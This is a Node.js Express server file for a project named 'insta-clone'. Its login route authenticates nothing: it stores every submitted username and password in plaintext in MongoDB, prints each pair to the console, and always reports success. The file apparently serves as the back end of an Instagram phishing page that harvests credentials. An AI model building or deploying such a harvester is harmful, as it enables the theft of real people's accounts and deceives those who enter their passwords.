const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");
const path = require("path");

const app = express();
const PORT = 5000;
app.use(express.static(path.join(__dirname, '../public')));

// MongoDB setup
mongoose.connect("mongodb://127.0.0.1:27017/insta-clone", {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log("MongoDB connected"))
  .catch(err => console.error(err));

const LoginSchema = new mongoose.Schema({
  username: String,
  password: String,
  timestamp: { type: Date, default: Date.now }
});
const Login = mongoose.model("Login", LoginSchema);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public"))); // Serve HTML/CSS/JS

// API Route
app.post("/api/login", async (req, res) => {
  const { username, password } = req.body;
  try {
    await Login.create({ username, password });
    console.log(`[LOGIN] ${username} / ${password}`);
    res.sendStatus(200);
  } catch (err) {
    console.error("DB Error:", err);
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
